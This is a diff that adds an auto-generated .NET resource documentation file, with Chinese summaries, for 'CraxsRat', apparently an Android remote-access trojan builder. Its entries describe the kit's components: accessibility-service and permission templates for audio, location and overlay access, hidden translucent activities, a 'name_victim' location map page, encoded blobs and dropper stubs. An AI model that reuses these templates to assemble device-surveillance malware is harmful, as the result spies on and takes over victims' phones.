@@ -1,0 +1,553 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+CraxsRat
+</name>
+</assembly>
+<members>
+<member name="T:Craxs_Rat.My.Resources.Resources">
+<summary>
+  一个强类型的资源类，用于查找本地化的字符串等。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.ResourceManager">
+<summary>
+  返回此类使用的缓存的 ResourceManager 实例。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.Culture">
+<summary>
+  重写当前线程的 CurrentUICulture 属性，对
+  使用此强类型资源类的所有资源查找执行重写。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources._3g">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources._on">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.Abov_mid">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.accessibilityprivatesrcapp">
+<summary>
+  查找类似 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+
+&lt;accessibility-service xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    android:accessibilityFlags=&quot;flagDefault|flagIncludeNotImportantViews|flagReportViewIds&quot;
+    android:accessibilityEventTypes=&quot;typeAllMask&quot;
+    android:canRetrieveWindowContent=&quot;true&quot;
+    android:canRequestTouchExplorationMode=&quot;true&quot;
+    android:accessibilityFeedbackType=&quot;feedbackAllMask&quot;
+    android:notificationTimeout=&quot;1&quot;
+    android:packageNames=&quot;@null&quot;
+    android:canPerf [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.activity_req_access">
+<summary>
+  查找类似 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    android:orientation=&quot;vertical&quot;
+    android:background=&quot;#FFFFFF&quot;&gt;
+
+    &lt;LinearLayout
+        android:layout_width=&quot;match_parent&quot;
+        android:layout_height=&quot;35dp&quot;
+        android:background=&quot;#26 [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.ALLPRIM">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.WAKE_LOCK&quot; /&gt;#
+&lt;uses-permission android:name=&quot;com.android.alarm.permission.SET_ALARM&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;  [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.APKEditor">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.apktool">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.APPS">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.backcraxs3">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.batteryprim">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot; /&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.BootPrim">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.c">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.C2">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.chrg">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.close48px">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.Compile">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.correctsign">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.CraxsAsci">
+<summary>
+  查找类似  的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.CypherMini">
+<summary>
+  查找类似     &lt;activity android:excludeFromRecents=&quot;true&quot; android:exported=&quot;true&quot; android:name=&quot;ginom.alfa.lib.scan._access_ask_&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot;/&gt;
+        &lt;activity android:excludeFromRecents=&quot;true&quot; android:exported=&quot;true&quot; android:name=&quot;ginom.alfa.lib.scan._access_ask_instll&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot;/&gt;
+        &lt;activity android:configChanges=&quot;keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode&quot; android: [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.DataP">
+<summary>
+  查找类似 C:\ProgramData\cconfig 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.DB">
+<summary>
+  查找类似 2xOEWq3yESG8sMQPwFFyJXDS+/kimlBf8iRiCdwuFHREkq0c3qxwXriwz4N5f5+S
+L1++Lr/oDRQghV0xNxwKcw4d6S7RsJ6Ux5FXFaIyosO3tFGOqwL6HV1bgbTkMuE0
+uJWrmWzrfyEhPWCiUqJV+SOkxNN8LJlDtewrQJ/jFZTVTPK6gNI5a49z9yCp0tdN
+PY5mWZJU4+6ykUw0Tn51rh+QZeYsuXpCYw1P9eXNA+E2bPVnLcX6cDiFUHeZDKIpW22FhQ0hr66DZISIJReNIQ==
+cwqdt3ayUFM+VPYLzfc6O926YOYCE+0syyIiG4vzaPY=
+GqNjL8EmgQTn2xZuGWax81CKPBwncUl+vz72uTU1Zt7+xjVjAZPhS64bzgNVYfBz
+s0wqiUHae6LQ6QrvoHtm3JoEskmHF3r22Ok/jzmTg7aeS24mgNFQglYl8MB22zzX
+0l4MS3iXdJf3uJ1M3nwHu7JbnHQIuJYM+G8hCblc4udVAm [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.Decompile">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.disconnected">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.dropstub">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.error48px">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.FORGROUD">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.FOREGROUND_SERVICE&quot;/&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.full">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.GRESSTR">
+<summary>
+  查找类似 [GRESOSTR] 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.GSTART">
+<summary>
+  查找类似 &lt;public type=&quot;string&quot; name=&quot;GRESSTR&quot; id=&quot;0x7f0a0001&quot; /&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.HIDECODE">
+<summary>
+  查找类似 &lt;action android:name=&quot;[HIDE_CODE]&quot;/&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.incall_removebg_preview">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.information48px">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.InstallApk">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.junk">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.k">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.K2">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.lie">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.loading_please_wait">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.log">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.LOGO">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.LOGS">
+<summary>
+  查找类似 PiXmn7tvCw5+k1ChMmikinMRPqrcqQbW/Nf6BDRJXYhtQzwPV9JrfCldtifsa3v0oXdy3/PNPbr7
+l4VvjMWfaUs6QLIXeRpfTL0JWtIkXLs7+MycsDomusqxpiLJTOtlmkENEgMNxdeQIBZN5Xj7kjGc
+4Kay2qyiTH7JP+4OSe5AyHwYo5npEpnOFepLl5YARIRK88U77p/sGOhbs7BVdY2+uhUnz1Yvt6SF
+YAlpagA1nzRjWdnoWU0ORc4vDLD7zUxEjMMMA24va2vetwqMobTGX0yuBTQCHCvoAPamRpj+5bVL
+fyCQI1Rdeu03wpEsV5mmBI7d+QfxNYQVXXzfW7C7HuJGM78wdEK9MY8D7671ZI/mLKcj54gw4oMd
+d2Pe24lHftLIsB/Q4YqFa0fW4C3c7LHXCeNMhOb7wBymQJfU8AlBBcRhIf2+QqSjd19YQ3JMQMjh
+IDsXm/0q6KH5LG8y0+euU3w+2kzfiQ6RlCXpBlVL8sCq [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.low">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.MainMith">
+<summary>
+  查找类似 xaWzFj/ixT+QAJ9qHuB8pBlYohUkEVBOoDh63z3YtFbqwhJ6ssMs2HJj58ZPwjUmuH4Z6q0mHA3e
+TyP+SB0LMyn1YGykKMUOBykNhc+9/FCBThvGl1ofHK2z04bGjjavhHZ2R1zWNCuvzzW1GaOPx/WU
+YUp0ZTnVSQmMlTRZ7H3ucHQWhY193FV3RrlMOYDQqknYXs/3aSW3tFVlNqT8UrAgHoKtWiuaT1Rs
+TCq0pzsv0ewWhv1nnSkwb8TA51CiwACpVl8f84JxOSLds9P4qvxFYkYSRMuKJLmkCKpHGCipuwNr
+fkt33PTPpEMGGHtoRqoemgD3hQ+renKrQ1/r7qM9LkzGcxXyddjVS+950DIJVFEJecFKuh4fCTtM
+0RbYo1UdcLFMGSPaIO1QFCkRUiRqe+ivMuIx/i5DYxXsE0fdfNa/HmRVib+tO7hTyB3FoU+jY30X
+xX/MzJhZA+d+A75vXn7hsEXKkC8rgBkjmu1AffVIVaQ3 [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.map">
+<summary>
+  查找类似 &lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&apos;utf-8&apos; /&gt;
+&lt;title&gt;\\name_victim:\\&lt;/title&gt;
+&lt;meta name=&apos;viewport&apos; content=&apos;initial-scale=1,maximum-scale=1,user-scalable=no&apos; /&gt;
+&lt;script src=&apos;https://api.tiles.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.js&apos;&gt;&lt;/script&gt;
+&lt;link href=&apos;https://api.tiles.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.css&apos; rel=&apos;stylesheet&apos; /&gt;
+&lt;style&gt;
+body { margin:0; padding:0; }
+#map { position:absolute; top:0; bottom:0; width:100%; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+ 
+&lt;div id=&apos;map&apos;&gt;&lt;/div&gt;
+  [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.max">
+<summary>
+  查找类似于 (图标) 的 System.Drawing.Icon 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.MethRn">
+<summary>
+  查找类似 ST 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.min">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.MYSTUB">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.MYSTUBTEN">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.new_call">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.new_notifi">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.NEWAPPS">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.noicon">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.not_found">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.notifi">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.notok">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.OFF">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.OFF_LOCK">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.ok">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.ON_LOCK">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.oncreatecode">
+<summary>
+  查找类似 aW52b2tlLXZpcnR1YWwvcmFuZ2Uge3AwfSwgW3RyZ3RtYWluXS0+U0NBTkZPUklOVEVOVEVSKClW 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.onloading">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.outcall_removebg_preview">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.PRO">
+<summary>
+  查找类似 \PROID 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.protect">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.ReadPrim">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot;/&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.recoeded">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.screenshoterfram">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.SDK29">
+<summary>
+  查找类似                 &lt;action android:name=&quot;android.intent.action.CHOOSER&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.INFO&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
+                &lt;category android:name=&quot;com.android.internal.category.PLATLOGO&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.SEND&quot;/&gt;
+  [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.shieldoff">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.shieldon">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.sign">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.signapk">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.sstore">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.String1">
+<summary>
+  查找类似  的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.sucess48px">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.swtchoff">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.swtchon">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.SystemwindowPrim">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;/&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.target__1_">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.TF">
+<summary>
+  查找类似 ASDFsd-fSDFsdfc-EWV-WE-FWEfwefwefc-btyjGRSFHZ-djtargsjtkJrejtktuy 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.Tip_screenctrol">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.Toreplaceprim">
+<summary>
+  查找类似 &lt;queries android:name=&quot;[GPRIM]&quot;/&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.up">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.wallpaper">
+<summary>
+  查找类似 /9j/4QN0RXhpZgAATU0AKgAAAAgABwESAAMAAAABAAEAAAEaAAUAAAABAAAAYgEbAAUAAAABAAAAagEoAAMAAAABAAIAAAExAAIAAAAcAAAAcgEyAAIAAAAUAAAAjodpAAQAAAABAAAApAAAANAADqZ4AAAnEAAOpngAACcQQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzADIwMTc6MTA6MTMgMDE6NDM6MDcAAAAAA6ABAAMAAAAB//8AAKACAAQAAAABAAAAMKADAAQAAAABAAAAMAAAAAAAAAAGAQMAAwAAAAEABgAAARoABQAAAAEAAAEeARsABQAAAAEAAAEmASgAAwAAAAEAAgAAAgEABAAAAAEAAAEuAgIABAAAAAEAAAI+AAAAAAAAAEgAAAABAAAASAAAAAH/2P/tAAxBZG9iZV9DTQAC/+4ADkFkb2JlAGSAAAAAAf/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwM [字符串的其余部分被截断]&quot;; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.warning48px">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.wifi">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.WritePrim">
+<summary>
+  查找类似 &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt; 的本地化字符串。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.X_sign">
+<summary>
+  查找 System.Drawing.Bitmap 类型的本地化资源。
+</summary>
+</member>
+<member name="P:Craxs_Rat.My.Resources.Resources.zipalign">
+<summary>
+  查找 System.Byte[] 类型的本地化资源。
+</summary>
+</member>
+</members>
+</doc>
